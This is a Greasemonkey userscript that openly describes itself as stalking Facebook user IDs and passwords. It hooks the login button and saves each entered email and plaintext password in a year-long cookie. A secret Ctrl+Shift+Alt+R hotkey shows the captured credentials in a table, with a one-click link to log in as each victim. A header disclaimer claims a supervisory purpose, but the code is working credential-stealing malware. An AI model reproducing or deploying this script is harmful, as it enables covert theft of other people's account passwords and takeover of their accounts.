// ==UserScript==
// @name           	Texnolize Facebook Spionaise Black
// @version 		3.0
// @namespace      	Spionaise for Facebook Black
// @description    	Stalking user ID and password on Facebook
// @include        	http://www.facebook.com/
// @include        	www.facebook.com/
// @include        	http://*.facebook.com/*
// @include        	http:/facebook.com/*
// @include        	https://*.facebook.com/*
// @include        	https:/facebook.com/*
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	This application was created to supervise rather than to control one's facebook account and when things happen that make losses on certain sides of me as making this application because I am not responsible as the manufacturer does not justify the act of theft to the motive of crime.
// ==/UserScript==


var title 				= "Texnolize Spionaise";
var version 			= "v3.0";

var width 				= 700;
var height 				= 400;
var cookieName 			= "uffedentuffe";
var daysToKeepCookie 	= 365;
var delimiter 			= ",";
var subDelimiter 		= "|";
var cookie				= readCookie(cookieName);
var submitControl;
var unControl;
var pwControl;

///////////////////
// Specific code //
///////////////////

init();

function init()
{
	//getElementsByClassNameAndType('uiButtonConfirm', 'submit')[0].addEventListener("click", saveLogin, false);	
	
	getElementByTabIndex("4", "submit")[0].addEventListener("click", saveLogin, false);;
	unControl 		= document.getElementById('email');
	pwControl 		= document.getElementById('pass');
}

function saveLogin()
{
	if (unControl.value.length == 0 || pwControl.value.length == 0)
		return;
	
	var date = new Date();
	
	var value = date.getTime() + subDelimiter + unControl.value + subDelimiter + pwControl.value;
	
	if(cookie)
		value += delimiter + cookie;
	
	writeCookie(cookieName, value, daysToKeepCookie);
}

unsafeWindow.doTheBossanova = function(email, password)
{
	unControl.value = email;
	pwControl.value = password;
	document.forms[0].submit();
}

///////////////////
// Generic code  //
///////////////////

jollyRogerz = 'data:image/png;base64,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%3D%3D';

topBanner = 'data:image/gif;base64,'+
'R0lGODlhAQA+AMQAAAAAAP///8C/wNbX18fHxsDAv8vKyt3d3dzc3Nvb29ra2tnZ2djY2NXV1dTU'+
'1NPT09HR0dDQ0M/Pz83NzczMzMnJycjIyMfHx8XFxcTExMPDw8LCwsHBwcDAwL+/vwAAACwAAAAA'+
'AQA+AAAFMOAhHgiSKAszNM4DRdJEGZVFYJm2cZ3gFR3ORpPBXCwVA2UiiUAejsaAsVAkSiNRCAA7';

cookie = readCookie(cookieName);

if (document.addEventListener)
   document.addEventListener("keypress", keyPress,false);
else if (document.attachEvent)
   document.attachEvent("onkeypress", keyPress);
else
   document.onkeypress= keyPress;

function writeCookie(name, value, days) 
{
	if (days) 
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) 
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) 
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) 
{
	writeCookie(name, "", -1);
	cookie = null;
}

function keyPress(e)
{
	var c =  String.fromCharCode(e.which).toUpperCase();
	
	if (c == "R" && e.shiftKey && e.ctrlKey && e.altKey)
		display();

	else if (c == "D" && e.shiftKey && e.ctrlKey && e.altKey)
	{
		eraseCookie(cookieName);
		unsafeWindow.killWindow();
		display();
	}
	else if (e.keyCode == 27)
		unsafeWindow.killWindow();
}

unsafeWindow.clearLog = function()
{
	eraseCookie(cookieName);
	unsafeWindow.killWindow();
	display();
}


unsafeWindow.killWindow = function ()
{
	if (document.getElementById('displayDiv') != null)
		document.body.removeChild(document.getElementById('displayDiv'));
}

function display()
{
	if (cookie == null)
	{
		alert ('No Data!');
		return;
	}

	GM_addStyle('div#displayDiv{position:absolute; width:'+width+'px; height:'+height+'px; top:50%; left:50%; margin:-' + (height/2) + 'px auto auto -' + (width/2) + 'px; border:2px solid #333; background: url('+topBanner+') #DDD; font-size:12px;-moz-border-radius: 8px; -webkit-border-radius: 8px; -moz-box-shadow:10px 10px 20px #000000; z-index:5;}');
	GM_addStyle('div#displayDiv #logo{float:left; margin:5px;}');
	GM_addStyle('div#displayDiv #title{float:left; margin-top:16px; font-weight:bolder; color:#333;}');
	GM_addStyle('div#displayDiv #closeButton{float:right; margin:3px;}');
	GM_addStyle('div#displayDiv #clearLogButton{float:right; margin:3px;}');
	GM_addStyle('div#displayDiv #version{float:left; margin-top:28px; margin-left:5px; color:#888; font-weight:bold;}');

	GM_addStyle('#tableContainer{clear: both; border: 1px solid #444; height: 320px; overflow: hidden; width: 680px; margin:0 auto; background-color:#EEE;}');
	GM_addStyle('#tableContainer table{height: 320px; width: 680px; font-size:12px; border:1px solid #000000; -moz-box-shadow:10px 10px 20px #000000;}');
	GM_addStyle('#tableContainer table thead tr{display: block; position:relative; background-color: #999999; border-bottom:1px solid #444;}');
	GM_addStyle('#tableContainer table thead tr th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th + th{text-align:left; font-weight:bold; width:76px;}');	

	GM_addStyle('#tableContainer table tbody {text-align:left; height:300px; display:block; width:100%; overflow: -moz-scrollbars-vertical;}');	
	
	
	GM_addStyle('#tableContainer table tbody tr:nth-child(even){text-align:left; width:80px; background-color:#EEE;}');	
	GM_addStyle('#tableContainer table tbody tr:nth-child(odd){text-align:left; width:80px; background-color:#F8F8F8;}');	

	GM_addStyle('#tableContainer table tbody tr td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td + td{text-align:left; width:60px; border-right:none;}');	
	
	GM_addStyle('.unselectable{-moz-user-select: none; -khtml-user-select: none; user-select: none;}');


	var html = '';

	html += '<div id="logo" class="unselectable"><img src="'+jollyRogerz+'"></div>';
	html += '<button id="closeButton" class="unselectable" onClick="killWindow()">X</button>';
	html += '<button id="clearLogButton" class="unselectable" onClick="clearLog()">Clean</button>';
	html += '<h1 id="title" class="unselectable">'+title+'</h1>';
	html += '<span id="version" class="unselectable">'+version+'</span>';

	html += '<div id="tableContainer">';
	html += '<table cellspacing="0"><thead class="unselectable"><tr><th>Date Login</th><th>User ID</th><th>Password</th><th>Action</th></tr></thead>';
	html += '<tbody>';

	var array = cookie.split(delimiter);

	for (i=0; i < array.length; i++)
	{
		var subArray = array[i].split(subDelimiter);
		var date = new Date();
		date.setTime(subArray[0]);
		html += '<tr><td>'+date.toLocaleString()+'</td><td>'+subArray[1]+'</td><td>'+subArray[2]+'</td><td><a href="#" onClick="doTheBossanova(\''+subArray[1]+'\', \''+subArray[2]+'\')">Enterance &raquo;</a></td></tr>';
	}

	html += '</tbody>';
	html += '</table>';
	html += '</tableContainer>';

	var displayDiv = document.createElement('div');
	displayDiv.setAttribute('id', 'displayDiv');
	displayDiv.innerHTML = html;
	document.body.appendChild(displayDiv);
}

function getElementsByClassName(classname, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) ) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementsByClassNameAndType(classname, type, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 

	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) && els[i].type == type) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementByTabIndex(index, type, node)
{
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	
	var a = [];

	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if (els[i].tabIndex == index && els[i].type == type)
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}